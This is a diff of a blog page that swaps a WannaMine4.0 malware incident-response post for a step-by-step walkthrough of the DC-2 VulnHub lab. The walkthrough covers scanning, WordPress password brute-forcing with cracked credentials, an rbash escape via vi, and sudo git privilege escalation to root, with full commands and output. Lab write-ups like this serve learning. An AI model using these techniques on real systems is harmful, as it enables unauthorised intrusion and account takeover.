@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="应急响应—WannaMine4.0, Python">
+    <meta name="keywords" content="渗透测试—DC_2, Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>应急响应—WannaMine4.0 | valecalida&#39;s house</title>
+    <title>渗透测试—DC_2 | valecalida&#39;s house</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -307,12 +307,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2020/04/14/GzkhB4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">应急响应—WannaMine4.0</h1>
+                    <h1 class="description center-align post-title">渗透测试—DC_2</h1>
                 </div>
             </div>
         </div>
@@ -437,12 +437,20 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Emergency-Response/">
-                                <span class="chip bg-color">Emergency_Response</span>
+                            <a href="/tags/Penetration-Test/">
+                                <span class="chip bg-color">Penetration_Test</span>
                             </a>
                         
-                            <a href="/tags/WannaMine4-0/">
-                                <span class="chip bg-color">WannaMine4.0</span>
+                            <a href="/tags/Metasploit/">
+                                <span class="chip bg-color">Metasploit</span>
+                            </a>
+                        
+                            <a href="/tags/WordPress/">
+                                <span class="chip bg-color">WordPress</span>
+                            </a>
+                        
+                            <a href="/tags/WPScan/">
+                                <span class="chip bg-color">WPScan</span>
                             </a>
                         
                     </div>
@@ -453,8 +461,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Emergency-Response/" class="post-category">
-                                Emergency_Response
+                            <a href="/categories/Penetration-Test/" class="post-category">
+                                Penetration_Test
                             </a>
                         
                     </div>
@@ -466,7 +474,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-14
+                    2020-04-21
                 </div>
                 
 
@@ -475,14 +483,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    968
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
 
@@ -498,72 +506,140 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="应急响应—WannaMine4-0"><a href="#应急响应—WannaMine4-0" class="headerlink" title="应急响应—WannaMine4.0"></a>应急响应—WannaMine4.0</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>​        最近在学应急响应，于是找到了 <code>WannaMine4.0</code> 的虚拟机环境，利用工具 <code>ProcessHacker</code> , <code>PCHunter</code> 对虚拟机环境进行分析，本次应急响应主要获取的内容如下：</p>
-<ul>
-<li>矿池域名</li>
-<li>恶意文件存放目录</li>
-<li>恶意启动项或服务或计划任务名字</li>
-</ul>
-<p>Tips：由于环境比较老、不够完善，而且站点已经关闭了，所以文章内容、图片质量可能会有所…</p>
-<h2 id="二、项目过程"><a href="#二、项目过程" class="headerlink" title="二、项目过程"></a>二、项目过程</h2><h3 id="1、虚拟机网络设置"><a href="#1、虚拟机网络设置" class="headerlink" title="1、虚拟机网络设置"></a>1、虚拟机网络设置</h3><p>​        将网络设置为仅主机</p>
-<h3 id="2、病毒现象"><a href="#2、病毒现象" class="headerlink" title="2、病毒现象"></a>2、病毒现象</h3><h4 id="2-1、服务器CPU占用率高"><a href="#2-1、服务器CPU占用率高" class="headerlink" title="2.1、服务器CPU占用率高"></a>2.1、服务器CPU占用率高</h4><img src="https://s1.ax1x.com/2020/04/14/Gzl9cd.png">
+                <h1 id="渗透测试—DC-2"><a href="#渗透测试—DC-2" class="headerlink" title="渗透测试—DC_2"></a>渗透测试—DC_2</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p>前几篇博客写了主机发现的两个小部分，下面两个分别是 <code>Ping扫描</code> 跟 <code>ARP扫描</code> 。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://valecasec.github.io/2020/04/18/scapy-arp-sao-miao/
+https://valecasec.github.io/2020/04/17/scapy-ping-sao-miao/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>这里使用进行 <code>Ping扫描</code> 主机发现，看到存活了一个主机：<code>10.87.51.20</code> </p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost Desktop<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># python Ping_Scan.py 10.87.51.0/24</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.1 is alive
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.3 is alive
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.20 is alive
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 本次扫描共花费 9.868978261947632 秒
+<span class="token comment" spellcheck="true">#这里也可以用ARP扫描，时间会更快一些</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>使用 <code>Nmap</code> 对目标站点进行扫描，发现了开放了 <code>80</code> 端口及 <code>7744</code> 作为 <code>ssh</code> 端口</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop<span class="token comment" spellcheck="true"># nmap -sV -p- 10.87.51.20</span>
+Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-20 08:16 EDT
+Nmap scan report <span class="token keyword">for</span> dc-2 <span class="token punctuation">(</span>10.87.51.20<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   <span class="token function">open</span>  http    Apache httpd 2.4.10 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+7744/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 6.7p1 Debian 5+deb8u7 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
+MAC Address: 00:0C:29:1A:11:62 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里作者已经提示了需要改 <code>host</code> 文件才能访问对应站点，在 <code>Kali Linux</code> 下修改：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop<span class="token comment" spellcheck="true"># cat /etc/hosts</span>
+127.0.0.1       localhost
+127.0.1.1       kali
+10.87.51.20     dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以很直观的看到这是基于 <code>Wordpress</code> 搭建的站点，且 <code>Wordpress</code> 的后台登录网址是 <code>wp-login.php</code> </p>
+<img src="https://s1.ax1x.com/2020/04/20/J1aDTP.png">
 
-<center>任务管理器-性能</center>
+<p>可以看到，在最后一个模块中直接看到了 <code>Flag</code> 的字眼，打开查看</p>
+<img src="https://s1.ax1x.com/2020/04/20/J1dF6H.png">
 
-<p>​        这里可以看到CPU使用率是50%，在后面的分析中可以看到相应的代码</p>
-<h4 id="2-2、服务器主动访问恶意域名"><a href="#2-2、服务器主动访问恶意域名" class="headerlink" title="2.2、服务器主动访问恶意域名"></a>2.2、服务器主动访问恶意域名</h4><p>​        在环境中可以使用 <code>Process Hacker</code> 的 <code>Network</code> 部分检测， 因为环境的问题，这里直接写：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">totonm.com、cake.pilutce.com:443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="2-3、扫描内外基于445端口的SMB服务"><a href="#2-3、扫描内外基于445端口的SMB服务" class="headerlink" title="2.3、扫描内外基于445端口的SMB服务"></a>2.3、扫描内外基于445端口的SMB服务</h4><h3 id="3、使用PCHunter检测数字签名找到异常进程"><a href="#3、使用PCHunter检测数字签名找到异常进程" class="headerlink" title="3、使用PCHunter检测数字签名找到异常进程"></a>3、使用PCHunter检测数字签名找到异常进程</h3><p>​        直接右击点击校验所有数字签名</p>
-<img src="https://s1.ax1x.com/2020/04/14/GzlHPS.png">
+<h2 id="三、口令爆破"><a href="#三、口令爆破" class="headerlink" title="三、口令爆破"></a>三、口令爆破</h2><p>这里提示我们使用 <code>cewl</code> 这个工具保存字典</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># cewl http://dc-2/ -w dic.txt</span>
+root@kali:~<span class="token comment" spellcheck="true"># wc -l dic.txt</span>
+238 dic.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>这里已经知道用什么建站了，而且已经有密码字典了，所以使用 <code>wpscan</code> 直接探测用户名</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># wpscan --url http://dc-2/ -e u</span>
+<span class="token comment" spellcheck="true">#下面找几天比较有用的信息</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> admin
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> jerry
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里扫出了三个用户名，然后再尝试使用 <code>wpscan</code> 爆破密码</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># wpscan --url http://dc-2/ -U jerry -P dic.txt</span>
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Valid Combinations Found:
+ <span class="token operator">|</span> Username: jerry, Password: adipiscing
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Valid Combinations Found:
+ <span class="token operator">|</span> Username: tom, Password: parturient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用用户名 <code>jerry</code> 登录到 <code>Wordpress</code> ，发现了 <code>flag2</code> </p>
+<img src="https://s1.ax1x.com/2020/04/20/J1yLee.png">
 
-<p>​        等到检测完成后可以看到标红的五个中，有三个是VMware本身的进程，一个是PCHunter的进程，那么最后这个 <code>dllhostex.exe *32</code> 就是有问题的了。</p>
-<img src="https://s1.ax1x.com/2020/04/14/Gz33fU.png">
+<p>之前还扫描出了 <code>SSH</code> 运行在 <code>7744</code> 端口，可以尝试使用之前爆破出的两个密码来登录</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#使用Jerry登录失败</span>
+C:\<span class="token operator">></span>ssh jerry@10.87.51.20 -p 7744
+jerry@10.87.51.20's password:
+Permission denied, please try again.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <code>tom</code> 这个用户登录成功，不过发现有 <code>rbash</code> 这种限制。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">C:\Users\Savalen<span class="token operator">></span>ssh tom@10.87.51.20 -p 7744
+tom@10.87.51.20's password:
+tom@DC-2:~$ <span class="token function">whoami</span>
+-rbash: whoami: <span class="token function">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里发现 <code>less</code> 命令可以使用，查看家目录下的 <code>flag3.txt</code> 文件。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">tom@DC-2:~$ <span class="token function">less</span> flag3.txt
+Poor old Tom is always running after Jerry. Perhaps he should <span class="token function">su</span> <span class="token keyword">for</span> all the stress he causes.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>这里提示 <code>jerry</code> 的权限是比 <code>tom</code> 的权限高的，让我们使用 <code>su</code> 命令切换用户，在经过测试后，发现下面几个命令是可用的</p>
+<pre class="line-numbers language-bash"><code class="language-bash">tom@DC-2:~$ <span class="token function">ls</span> -R usr
+usr:
+bin
 
-<h3 id="4、使用ProcessHacker找到站点等具体信息"><a href="#4、使用ProcessHacker找到站点等具体信息" class="headerlink" title="4、使用ProcessHacker找到站点等具体信息"></a>4、使用ProcessHacker找到站点等具体信息</h3><p>​        在进程中找到<code>dllhostex.exe</code> ，然后点击查看属性</p>
-<img src="https://s1.ax1x.com/2020/04/14/Gz31YT.png">
+usr/bin:
+<span class="token function">less</span>  <span class="token function">ls</span>  <span class="token function">scp</span>  <span class="token function">vi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="四、rbash-突破及-git-提权"><a href="#四、rbash-突破及-git-提权" class="headerlink" title="四、rbash 突破及 git 提权"></a>四、<code>rbash</code> 突破及 <code>git</code> 提权</h2><p>这里使用 <code>vi</code> 进行突破</p>
+<pre class="line-numbers language-bash"><code class="language-bash">:set shell/bin/bash
+:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>发现可以用一些其他命令了，获取到了 <code>flag4.txt</code> 。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">tom@DC-2:~$ <span class="token function">pwd</span>
+/home/tom
+tom@DC-2:/home/jerry$ <span class="token function">less</span> flag4.txt
+Good to see that you<span class="token string">'ve made it this far - but you'</span>re not home yet. Good to see that you<span class="token string">'ve made it this far - but you'</span>re not home yet.
 
-<p>​        找到属性中的 <code>Memory</code>， 可以发现有 <code>RWX</code> 权限的条目，点击Strings，查看具体信息。这个Minimum是用来设置显示字符串长度的，一般不用改，点击Ok就能查看了</p>
-<img src="https://s1.ax1x.com/2020/04/14/Gz3lkV.png">
+You still need to get the final flag <span class="token punctuation">(</span>the only flag that really counts<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">)</span>.
 
-<p>​        下拉可以看到一些信息，比如连接的站点，还有限制CPU占用率的代码</p>
-<img src="https://s1.ax1x.com/2020/04/14/GzUIVH.png">
+No hints here - you're on your own now.  :-<span class="token punctuation">)</span>
 
-<p>通过微步在线验证一下(图是以前的….)</p>
-<img src="https://s1.ax1x.com/2020/04/14/Gz4uRK.png">
+Go on - <span class="token function">git</span> outta here<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
 
-<p>继续往下找，又得到了一个站点</p>
-<img src="https://s1.ax1x.com/2020/04/14/GzdRBD.png">
+flag4.txt <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先切换用户到 <code>jerry</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">tom@DC-2:/home/jerry$ /bin/su jerry
+Password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>这里提示我们使用 <code>git</code> 命令来提权</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">git</span> -p <span class="token function">help</span> config
+GIT-CONFIG<span class="token punctuation">(</span>1<span class="token punctuation">)</span>                                        Git Manual                                        GIT-CONFIG<span class="token punctuation">(</span>1<span class="token punctuation">)</span>
 
-<p>​        站点到这获取的就差不多了，接下来获取其他的信息</p>
-<h3 id="5、获取启动项"><a href="#5、获取启动项" class="headerlink" title="5、获取启动项"></a>5、获取启动项</h3><p>​        返回来继续使用PCHunter，查看启动信息，找到启动项，校验数字签名</p>
-<img src="https://s1.ax1x.com/2020/04/14/GzwTIJ.png">
 
-<p>​        可以发现，得到了一条自启动信息，<code>Microsoft Windows({44BBA840-CC51-11CF-AAFA-00AA00B6015C})</code></p>
-<img src="https://s1.ax1x.com/2020/04/14/Gzwoa4.png">
 
-<h3 id="6、获取服务信息"><a href="#6、获取服务信息" class="headerlink" title="6、获取服务信息"></a>6、获取服务信息</h3><p>​        与上面一样的操作，进行校验，得到了名为 <code>Application RPC Client</code> 的服务项</p>
-<img src="https://s1.ax1x.com/2020/04/14/GzwIZF.png">
+NAME
+       git-config - Get and <span class="token keyword">set</span> repository or global options
 
-<h3 id="7、找到相应的文件"><a href="#7、找到相应的文件" class="headerlink" title="7、找到相应的文件"></a>7、找到相应的文件</h3><h4 id="7-1、命名规则"><a href="#7-1、命名规则" class="headerlink" title="7.1、命名规则"></a>7.1、命名规则</h4><p>​        恶意服务名为以下三个列表中各选一个，然后进行字符串拼接(如: ApplicationNetBIOSClient，其由字符串1 Application + 字符串2 NetBIOS + 字符串3 Client 拼接生成)。</p>
-<ul>
-<li>Windows、Microsoft、Network、Remote、Function、Secure、Application</li>
-<li>Update、Time、NetBIOS、RPC、Protocol、SSDP、UPnP</li>
-<li>Service、Host、Client、Event、Manager、Helper、System</li>
-</ul>
-<h4 id="7-2、通过进程、服务定位到文件"><a href="#7-2、通过进程、服务定位到文件" class="headerlink" title="7.2、通过进程、服务定位到文件"></a>7.2、通过进程、服务定位到文件</h4><pre class="line-numbers language-bash"><code class="language-bash">C:\Windows\SysWOW64\ApplicationRPCClient.dll
-C:\Windows\SysWOW64\dllhostex.exe
-<span class="token comment" spellcheck="true"># 如果环境正常的话还可能有</span>
-C:Windows\System32ApplicationNetBlOSlient.dll
-<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="7-3、WannaMine4-0-是通过永恒之蓝进行传播的，可以在-C-Windows-NetworkDistribution-文件夹下找到对应文件"><a href="#7-3、WannaMine4-0-是通过永恒之蓝进行传播的，可以在-C-Windows-NetworkDistribution-文件夹下找到对应文件" class="headerlink" title="7.3、WannaMine4.0 是通过永恒之蓝进行传播的，可以在 C:\Windows\NetworkDistribution 文件夹下找到对应文件"></a>7.3、WannaMine4.0 是通过永恒之蓝进行传播的，可以在 <code>C:\Windows\NetworkDistribution</code> 文件夹下找到对应文件</h4><h2 id="三、查杀及修补"><a href="#三、查杀及修补" class="headerlink" title="三、查杀及修补"></a>三、查杀及修补</h2><h3 id="1、查杀"><a href="#1、查杀" class="headerlink" title="1、查杀"></a>1、查杀</h3><p>​        通过上面的分析过程已经找出相应的服务、进程，分别对其进行停止、删除等操作，如果有重要业务，还可以先通过暂停相应的进程保证业务的正常运转，在空闲时进行相应操作。</p>
-<h3 id="2、修补方式"><a href="#2、修补方式" class="headerlink" title="2、修补方式"></a>2、修补方式</h3><ol>
-<li>利用系统防火墙高级设置阻止向445端口进行连接（该操作会影响使用445端口的服务）。 </li>
-<li>尽量关闭不必要的文件共享； </li>
-<li>采用高强度的密码，避免使用弱口令密码，并定期更换密码； </li>
-<li>打开系统自动更新，并检测更新进行安装。 </li>
-<li>系统打上<code>MS17-010</code>对应的Microsoft Windows SMB 服务器安全更新 (4013389)补丁程序</li>
-</ol>
-<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h2><p>​        这只是个人学习过程中的一点记录，由于环境等各种原因，可能内容有些杂乱。。。</p>
+SYNOPSIS
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>-z<span class="token operator">|</span>--null<span class="token punctuation">]</span> name <span class="token punctuation">[</span>value <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span><span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> --add name value
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> --replace-all name value <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>-z<span class="token operator">|</span>--null<span class="token punctuation">]</span> --get name <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>-z<span class="token operator">|</span>--null<span class="token punctuation">]</span> --get-all name <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>-z<span class="token operator">|</span>--null<span class="token punctuation">]</span> --get-regexp name_regex <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>-z<span class="token operator">|</span>--null<span class="token punctuation">]</span> --get-urlmatch name URL
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> --unset name <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+       <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>file-option<span class="token operator">></span><span class="token punctuation">]</span> --unset-all name <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span>
+<span class="token operator">!</span>/bin/sh
+<span class="token comment" spellcheck="true"># whoami</span>
+root
+<span class="token comment" spellcheck="true"># ls /root</span>
+final-flag.txt
+<span class="token comment" spellcheck="true"># cat /root/final-flag.txt</span>
+ __    __     _ _       _                    _
+/ / /\ \ \___<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>   __<span class="token operator">|</span> <span class="token operator">|</span> ___  _ __   ___  / \
+\ \/  \/ / _ \ <span class="token operator">|</span> <span class="token operator">|</span>  / _` <span class="token operator">|</span>/ _ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it'</span>s all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Additions："><a href="#Additions：" class="headerlink" title="Additions："></a>Additions：</h3><p>文章借鉴了下面的站点:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://gtfobins.github.io/gtfobins/git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>另外，作为一个初学者，自己会的真的很少，希望自己以后能够越走越远吧，加油~</p>
 
             </div>
             <hr/>
@@ -589,7 +665,7 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://valecasec.github.io/2020/04/14/ying-ji-xiang-ying-wannamine4.0/">https://valecasec.github.io/2020/04/14/ying-ji-xiang-ying-wannamine4.0/</a>
+                    <a href="https://valecasec.github.io/2020/04/21/shen-tou-ce-shi-dc2/">https://valecasec.github.io/2020/04/21/shen-tou-ce-shi-dc2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -627,12 +703,20 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Emergency-Response/">
-                                    <span class="chip bg-color">Emergency_Response</span>
+                                <a href="/tags/Penetration-Test/">
+                                    <span class="chip bg-color">Penetration_Test</span>
                                 </a>
                             
-                                <a href="/tags/WannaMine4-0/">
-                                    <span class="chip bg-color">WannaMine4.0</span>
+                                <a href="/tags/Metasploit/">
+                                    <span class="chip bg-color">Metasploit</span>
+                                </a>
+                            
+                                <a href="/tags/WordPress/">
+                                    <span class="chip bg-color">WordPress</span>
+                                </a>
+                            
+                                <a href="/tags/WPScan/">
+                                    <span class="chip bg-color">WPScan</span>
                                 </a>
                             
                         </div>
@@ -938,28 +1022,30 @@ C:Windows\System32ApplicationNetBlOSlient.dll
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/04/16/shen-tou-ce-shi-typhoon-v1.02/">
+                <a href="/2020/04/21/shen-tou-ce-shi-dc2/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2020/04/17/JEmw26.jpg" class="responsive-img" alt="渗透测试—Typhoon_V1.02">
                         
-                        <span class="card-title">渗透测试—Typhoon_V1.02</span>
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="渗透测试—DC_2">
+                        
+                        <span class="card-title">渗透测试—DC_2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Typhoon_V1.02靶场的几个漏洞检测、利用及提权，一篇水水的渗透测试文章...
+                            一次对VulnHub靶机的渗透测试，目录不尽人意，只作为学习过程的一个记录...
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -972,6 +1058,7 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -983,8 +1070,12 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                         <span class="chip bg-color">Metasploit</span>
                     </a>
                     
-                    <a href="/tags/Typhoon/">
-                        <span class="chip bg-color">Typhoon</span>
+                    <a href="/tags/WordPress/">
+                        <span class="chip bg-color">WordPress</span>
+                    </a>
+                    
+                    <a href="/tags/WPScan/">
+                        <span class="chip bg-color">WPScan</span>
                     </a>
                     
                 </div>
@@ -998,30 +1089,30 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/04/13/windows-xia-shu-tong-huan-jing-da-jian/">
+                <a href="/2020/04/20/scapy-arp-qi-pian/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2020/04/14/Jp8pjg.jpg" class="responsive-img" alt="Windows下数通环境搭建">
+                        <img src="https://s1.ax1x.com/2020/04/20/J1euWT.jpg" class="responsive-img" alt="Scapy—ARP欺骗">
                         
-                        <span class="card-title">Windows下数通环境搭建</span>
+                        <span class="card-title">Scapy—ARP欺骗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            数通环境的搭建，多个软件不同版本之间的协调使得两个模拟器在Windows上共存共用...
+                            使用Python3实现的ARP欺骗，又是一篇水文，每天进步一点点...
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Switching%E3%80%81Routing/" class="post-category">
-                                    Switching、Routing
+                            <a href="/categories/Scapy/" class="post-category">
+                                    Scapy
                                 </a>
                             
                             
@@ -1031,20 +1122,12 @@ C:Windows\System32ApplicationNetBlOSlient.dll
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/H3C/">
-                        <span class="chip bg-color">H3C</span>
+                    <a href="/tags/Scapy/">
+                        <span class="chip bg-color">Scapy</span>
                     </a>
                     
-                    <a href="/tags/eNSP/">
-                        <span class="chip bg-color">eNSP</span>
-                    </a>
-                    
-                    <a href="/tags/Wireshark/">
-                        <span class="chip bg-color">Wireshark</span>
-                    </a>
-                    
